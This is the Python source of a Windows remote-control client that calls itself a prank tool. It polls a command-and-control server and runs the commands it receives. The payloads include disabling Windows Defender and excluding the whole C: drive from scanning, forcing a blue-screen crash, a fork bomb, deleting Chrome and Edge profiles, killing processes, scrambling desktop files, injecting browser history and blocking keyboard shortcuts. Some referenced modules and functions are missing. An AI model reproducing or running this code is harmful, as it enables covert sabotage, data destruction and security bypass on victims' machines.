# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os, sys, socket, uuid, time, requests, threading, subprocess, random, string, tkinter as tk, shutil
try:
    import pyautogui, winsound, webbrowser, ctypes, psutil, cv2
    from PIL import Image, ImageTk, ImageGrab
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    import winreg
    from urllib.request import urlopen
except ImportError: pass

# ==================================================================================================
# CONFIGURATION & GLOBALS
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003"; HEARTBEAT_INTERVAL = 5
STATE = { k: False for k in ["noise", "clicking", "typing", "caps_spam", "overlay", "usb_spam", "focus_steal", "cursor_change", "app_spam", "streamer_cam", "shortkey_lock", "self_dos", "screen_reader"] }
OVERLAY_WINDOW, CAM_WINDOW, GUI_ROOT = None, None, None
keyboard_hook = None

# ==================================================================================================
# ACTION FUNCTIONS
# ==================================================================================================
def placeholder_function(feature_name="Unknown", **kwargs):
    show_popup(title="Not Implemented", message=f"The '{feature_name}' feature is not yet implemented.")

def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "yes_no": 0x04}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()
def _noise_loop(sound_type="random", path=None):
    while STATE["noise"]:
        if sound_type == "custom" and path and os.path.exists(path): winsound.PlaySound(path, winsound.SND_FILENAME)
        elif sound_type == "random": winsound.Beep(random.randint(300, 2000), 150); time.sleep(0.05)
        elif sound_type == "ear_splitting": winsound.Beep(random.randint(8000, 15000), 500); time.sleep(0.05)
        elif sound_type == "knocking": winsound.PlaySound("SystemExit", winsound.SND_ALIAS); time.sleep(2)
def start_noise(sound_type="random", path=None):
    if not STATE["noise"]: STATE["noise"] = True; threading.Thread(target=_noise_loop, args=(sound_type, path), daemon=True).start()
def stop_noise(): STATE["noise"] = False
def set_volume(level=1.0):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume)); volume.SetMasterVolumeLevelScalar(float(level), None)
    except: pass
def _usb_spam_loop():
    while STATE["usb_spam"]:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
def start_usb_spam():
    if not STATE["usb_spam"]: STATE["usb_spam"] = True; threading.Thread(target=_usb_spam_loop, daemon=True).start()
def stop_usb_spam(): STATE["usb_spam"] = False
def _caps_lock_loop():
    while STATE["caps_spam"]:
        if ctypes.windll.user32.GetKeyState(0x14) == 0:
            ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)
def start_caps_lock():
    if not STATE["caps_spam"]: STATE["caps_spam"] = True; threading.Thread(target=_caps_lock_loop, daemon=True).start()
def stop_caps_lock(): STATE["caps_spam"] = False
def _create_overlay_window():
    global OVERLAY_WINDOW;
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes("-topmost", True)
    OVERLAY_WINDOW.overrideredirect(True)
    return OVERLAY_WINDOW
def start_overlay(overlay_type="color", alpha=0.5, color="black", path=None):
    if not STATE["overlay"]:
        STATE["overlay"] = True
        def _task():
            win = _create_overlay_window()
            win.attributes('-alpha', alpha)
            if overlay_type == "color":
                win.configure(bg=color)
            elif overlay_type == "fake_crack":
                try:
                    url = "https://github.com/Tether-Project/Tether/blob/main/Resources/Images/cracked_screen.png?raw=true"
                    with urlopen(url) as response:
                        image_data = response.read()
                    image = Image.open(io.BytesIO(image_data))
                    win.configure(bg="white"); win.attributes("-transparentcolor", "white") # Make white transparent
                    img_tk = ImageTk.PhotoImage(image)
                    label = tk.Label(win, image=img_tk, bg='white'); label.image = img_tk; label.pack()
                except Exception as e:
                    print(f"Failed to load crack image: {e}")
                    stop_overlay() # Clean up if it fails
        GUI_ROOT.after(0, _task)
def stop_overlay():
    if STATE["overlay"]:
        STATE["overlay"] = False
        if OVERLAY_WINDOW: GUI_ROOT.after(0, OVERLAY_WINDOW.destroy)
def _random_clicking_loop():
    w, h = pyautogui.size()
    while STATE["clicking"]: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def start_random_clicking():
    if not STATE["clicking"]: STATE["clicking"] = True; threading.Thread(target=_random_clicking_loop, daemon=True).start()
def stop_random_clicking(): STATE["clicking"] = False
def _random_typing_loop():
    while STATE["typing"]:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def start_random_typing():
    if not STATE["typing"]: STATE["typing"] = True; threading.Thread(target=_random_typing_loop, daemon=True).start()
def stop_random_typing(): STATE["typing"] = False
def open_cd_tray():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(3); ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except: pass
def _app_spam_loop():
    apps = ['notepad', 'calc', 'cmd', 'mspaint', 'explorer']
    while STATE["app_spam"]:
        try: os.startfile(random.choice(apps))
        except: pass
        time.sleep(random.uniform(1, 4))
def start_app_spam():
    if not STATE["app_spam"]: STATE["app_spam"] = True; threading.Thread(target=_app_spam_loop, daemon=True).start()
def stop_app_spam(): STATE["app_spam"] = False
def fake_shutdown(message="Windows is updating..."):
    def _sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, creationflags=0x08000000)
        time.sleep(30); subprocess.run('shutdown /a', shell=True, creationflags=0x08000000)
        show_popup("Update Failed", "The update could not be installed.", "error")
    threading.Thread(target=_sequence, daemon=True).start()
def random_filenames():
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    for filename in os.listdir(desktop):
        try:
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            os.rename(os.path.join(desktop, filename), os.path.join(desktop, random_name))
        except OSError: continue
def toggle_hide_icons():
    handle = ctypes.windll.user32.FindWindowW("Progman", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "SHELLDLL_DefView", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "FolderView", None)
    if ctypes.windll.user32.IsWindowVisible(handle): ctypes.windll.user32.ShowWindow(handle, 0)
    else: ctypes.windll.user32.ShowWindow(handle, 5)
def not_so_shortcut(url="https://google.com"):
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    for filename in os.listdir(desktop):
        full_path = os.path.join(desktop, filename)
        if os.path.isfile(full_path) and not filename.endswith('.url'):
            try:
                shortcut_path = full_path.rsplit('.', 1)[0] + ".url"
                with open(shortcut_path, "w") as f: f.write(f"[InternetShortcut]\nURL={url}\n")
                ctypes.windll.kernel32.SetFileAttributesW(full_path, 2)
            except: continue
def printer_spam(text_to_print="You've been hacked"):
    temp_file = os.path.join(os.environ["TEMP"], "print_job.txt")
    with open(temp_file, "w", encoding='utf-8') as f: f.write(text_to_print)
    for _ in range(10): 
        if sys.platform == "win32": os.startfile(temp_file, "print")
        time.sleep(0.5)
def set_wallpaper(path):
    if os.path.exists(path): ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
def open_website(url="https://google.com"): webbrowser.open(url)
def set_wifi(state="on"):
    action = "enable" if state == "on" else "disable"
    subprocess.run(f'powershell -Command "Get-NetAdapter -Name Wi-Fi* | {action}-NetAdapter"', shell=True, creationflags=0x08000000)
def set_airplane_mode(state="on"):
    value = "1" if state == "on" else "0"
    key_path = r"SYSTEM\CurrentControlSet\Control\RadioManagement\SystemRadioState"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Default", 0, winreg.REG_DWORD, int(value))
        winreg.CloseKey(key)
    except Exception as e: print(f"Failed to set airplane mode (likely needs admin): {e}")
def set_bluetooth(state="on"):
    action = "enable" if state == "on" else "disable"
    subprocess.run(f'powershell -Command "Get-PnpDevice -Class Bluetooth | {action}-PnpDevice -Confirm:$false"', shell=True, creationflags=0x08000000)
def set_screen_orientation(orientation="0"):
    try:
        orientation_val = int(orientation)
        if orientation_val not in [0, 1, 2, 3]: return
        device = ctypes.wintypes.DEVMODE()
        device.dmSize = ctypes.sizeof(device)
        if ctypes.windll.user32.EnumDisplaySettingsW(None, -1, ctypes.byref(device)) == 0: return
        if (device.dmDisplayOrientation + orientation_val) % 2 == 1:
            device.dmPelsWidth, device.dmPelsHeight = device.dmPelsHeight, device.dmPelsWidth
        device.dmDisplayOrientation = orientation_val
        ctypes.windll.user32.ChangeDisplaySettingsW(ctypes.byref(device), 0)
    except Exception as e: print(f"Failed to set screen orientation: {e}")
def set_taskbar_size(size="normal"):
    size_map = {"small": 1, "normal": 0, "large": 0}
    value = size_map.get(size, 0)
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "TaskbarSmallIcons", 0, winreg.REG_DWORD, value)
        subprocess.run("taskkill /f /im explorer.exe & start explorer.exe", shell=True, creationflags=0x08000000)
    except Exception: pass
def taskbar_scramble():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE) as key:
            value, _ = winreg.QueryValueEx(key, "Favorites")
            items = list(value)
            random.shuffle(items)
            winreg.SetValueEx(key, "Favorites", 0, winreg.REG_BINARY, bytes(items))
        subprocess.run("taskkill /f /im explorer.exe & start explorer.exe", shell=True, creationflags=0x08000000)
    except Exception as e: print(f"Failed to scramble taskbar: {e}")
def history_injector(urls=""):
    """### NOW IMPLEMENTED ###"""
    urls_to_add = [url.strip() for url in urls.split('\n') if url.strip()]
    if not urls_to_add: return
    history_db_paths = [info['path'] for info in find_browser_paths("History")]
    for db_path in history_db_paths:
        try:
            temp_db = shutil.copy2(db_path, os.path.join(os.environ["TEMP"], "history_temp.db"))
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            for url in urls_to_add:
                visit_time = int(time.time() * 1000000)
                cursor.execute("INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?, ?, ?, ?)", (url, f"History Injection {random.randint(1,1000)}", 1, visit_time))
            conn.commit()
            conn.close()
            os.remove(temp_db)
        except Exception as e: print(f"Could not inject history into {db_path}: {e}")
def disable_defender():
    """### NOW IMPLEMENTED ###"""
    commands = [
        r'Set-MpPreference -DisableRealtimeMonitoring $true',
        r'Add-MpPreference -ExclusionPath "C:\\"',
        r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force'
    ]
    for cmd in commands:
        subprocess.run(f"powershell -Command \"{cmd}\"", shell=True, capture_output=True, creationflags=0x08000000)
def _low_level_keyboard_proc(nCode, wParam, lParam):
    """### NOW IMPLEMENTED ### The callback for the keyboard hook."""
    if nCode >= 0 and STATE["shortkey_lock"]:
        # Block common shortcuts
        # 256 = WM_KEYDOWN, 257 = WM_KEYUP, 260 = WM_SYSKEYDOWN, 261 = WM_SYSKEYUP
        if wParam in [256, 257, 260, 261]:
            # Check for Alt+Tab, Ctrl+Esc, Alt+F4, Win key combinations
            alt_pressed = (lParam.contents.flags & 32) != 0 # Check for LLKHF_ALTDOWN
            ctrl_pressed = ctypes.windll.user32.GetKeyState(0x11) & 0x8000
            if (alt_pressed and lParam.contents.vkCode == 9) or \
               (ctrl_pressed and lParam.contents.vkCode == 27) or \
               (alt_pressed and lParam.contents.vkCode == 115) or \
               (lParam.contents.vkCode in [91, 92]):
                return 1 # Block the key press
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
def start_shortkey_lock():
    """### NOW IMPLEMENTED ###"""
    global keyboard_hook
    if not STATE["shortkey_lock"]:
        STATE["shortkey_lock"] = True
        CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        hook_proc_ptr = CMPFUNC(_low_level_keyboard_proc)
        keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(13, hook_proc_ptr, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        threading.Thread(target=ctypes.windll.user32.GetMessageW, args=(ctypes.byref(ctypes.wintypes.MSG()), None, 0, 0), daemon=True).start()
def stop_shortkey_lock():
    """### NOW IMPLEMENTED ###"""
    if STATE["shortkey_lock"] and keyboard_hook:
        STATE["shortkey_lock"] = False
        ctypes.windll.user32.UnhookWindowsHookEx(keyboard_hook)
def _focus_stealer_loop():
    p = subprocess.Popen(['notepad.exe'], creationflags=0x08000000)
    time.sleep(1); hwnd = ctypes.windll.user32.FindWindowW("Notepad", None)
    while STATE["focus_steal"]:
        try:
            if ctypes.windll.user32.GetForegroundWindow() != hwnd:
                ctypes.windll.user32.SetForegroundWindow(hwnd)
        except: pass
        time.sleep(3)
    p.terminate()
def start_focus_stealer():
    if not STATE["focus_steal"]: STATE["focus_steal"] = True; threading.Thread(target=_focus_stealer_loop, daemon=True).start()
def stop_focus_stealer(): STATE["focus_steal"] = False
def _cursor_changer_loop():
    cursors = [32512, 32513, 32514, 32515, 32516, 32640, 32642, 32643, 32644, 32645, 32646, 32648, 32649]
    while STATE["cursor_change"]:
        hcursor = ctypes.windll.user32.LoadCursorW(None, random.choice(cursors))
        ctypes.windll.user32.SetSystemCursor(hcursor, 32512); time.sleep(2)
    ctypes.windll.user32.SystemParametersInfoW(87, 0, None, 0) # Restore
def start_cursor_changer():
    if not STATE["cursor_change"]: STATE["cursor_change"] = True; threading.Thread(target=_cursor_changer_loop, daemon=True).start()
def stop_cursor_changer(): STATE["cursor_change"] = False
def start_streamer_cam():
    if not STATE["streamer_cam"]: STATE["streamer_cam"] = True; threading.Thread(target=_streamer_cam_loop, daemon=True).start()
def stop_streamer_cam(): STATE["streamer_cam"] = False
def start_screen_reader():
    if not STATE["screen_reader"]:
        STATE["screen_reader"] = True; subprocess.Popen(['narrator.exe'], creationflags=0x08000000)
def stop_screen_reader():
    if STATE["screen_reader"]:
        STATE["screen_reader"] = False; subprocess.run("taskkill /f /im narrator.exe", shell=True, creationflags=0x08000000)
def user_change():
    subprocess.run("shutdown /l", shell=True, creationflags=0x08000000)
def kill_tasks():
    critical = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and user in proc.info['username'] and proc.info['name'].lower() not in critical:
                psutil.Process(proc.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
def bsod():
    nullptr = ctypes.pointer(ctypes.c_int()); ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))
def browser_eraser():
    for path in [os.path.join(os.environ["LOCALAPPDATA"], b) for b in [os.path.join("Google", "Chrome", "User Data"), os.path.join("Microsoft", "Edge", "User Data")]]:
        if os.path.exists(path): shutil.rmtree(path, ignore_errors=True)
def fork_bomb():
    while True: subprocess.Popen([sys.executable, sys.argv[0]], creationflags=0x08000000)
def set_system_time(year, month, day, hour, minute):
    class SYSTEMTIME(ctypes.Structure):
        _fields_ = [('wYear', ctypes.wintypes.WORD), ('wMonth', ctypes.wintypes.WORD), ('wDayOfWeek', ctypes.wintypes.WORD), ('wDay', ctypes.wintypes.WORD), ('wHour', ctypes.wintypes.WORD), ('wMinute', ctypes.wintypes.WORD), ('wSecond', ctypes.wintypes.WORD), ('wMilliseconds', ctypes.wintypes.WORD)]
    try:
        st = SYSTEMTIME(int(year), int(month), 0, int(day), int(hour), int(minute), 0, 0)
        ctypes.windll.kernel32.SetSystemTime(ctypes.byref(st))
    except Exception as e: print(f"Failed to set time: {e}")
def _self_dos_loop(power=5):
    while STATE["self_dos"]:
        _ = [i*i for i in range(int(power * 1000))]
        time.sleep(max(0.001, 0.05 / power))
def start_self_dos(power=5):
    if not STATE["self_dos"]:
        STATE["self_dos"] = True; threading.Thread(target=_self_dos_loop, args=(power,), daemon=True).start()
def stop_self_dos(): STATE["self_dos"] = False

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        ACTION_MAP = {
            "show_popup": show_popup, "start_noise": start_noise, "stop_noise": stop_noise, "set_volume": set_volume,
            "start_usb_spam": start_usb_spam, "stop_usb_spam": stop_usb_spam, "start_overlay": start_overlay, "stop_overlay": stop_overlay,
            "start_random_clicking": start_random_clicking, "stop_random_clicking": stop_random_clicking, "start_random_typing": start_random_typing,
            "stop_random_typing": stop_random_typing, "open_cd_tray": open_cd_tray, "start_app_spam": start_app_spam, "stop_app_spam": stop_app_spam,
            "fake_shutdown": fake_shutdown, "set_wallpaper": set_wallpaper, "start_caps_lock": start_caps_lock, "stop_caps_lock": stop_caps_lock,
            "open_website": open_website, "set_wifi": set_wifi, "set_screen_orientation": set_screen_orientation, "start_focus_stealer": start_focus_stealer,
            "stop_focus_stealer": stop_focus_stealer, "set_system_time": set_system_time, "start_cursor_changer": start_cursor_changer,
            "stop_cursor_changer": stop_cursor_changer, "printer_spam": printer_spam, "start_streamer_cam": start_streamer_cam,
            "stop_streamer_cam": stop_streamer_cam, "fork_bomb": fork_bomb, "kill_tasks": kill_tasks, "bsod": bsod,
            "browser_eraser": browser_eraser, "start_self_dos": start_self_dos, "stop_self_dos": stop_self_dos,
            "random_filenames": random_filenames, "not_so_shortcut": not_so_shortcut, "toggle_hide_icons": toggle_hide_icons,
            "set_taskbar_size": set_taskbar_size, "taskbar_scramble": taskbar_scramble, "user_change": user_change,
            "start_screen_reader": start_screen_reader, "stop_screen_reader": stop_screen_reader, "set_airplane_mode": set_airplane_mode, "set_bluetooth": set_bluetooth,
            "history_injector": history_injector, "disable_defender": disable_defender, "start_shortkey_lock": start_shortkey_lock, "stop_shortkey_lock": stop_shortkey_lock,
            "dns_poison": lambda: placeholder_function("DNS Poison", **args), "safe_boot": lambda: placeholder_function("Safe Boot"), 
            "hijack_overclock": lambda: placeholder_function("Hijack Overclock")
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")
def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data and "tasks" in data and data["tasks"]: process_tasks(data["tasks"])
        except: pass
        time.sleep(HEARTBEAT_INTERVAL)
if __name__ == "__main__":
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True); c2_thread.start()
    GUI_ROOT = tk.Tk(); GUI_ROOT.withdraw(); GUI_ROOT.mainloop()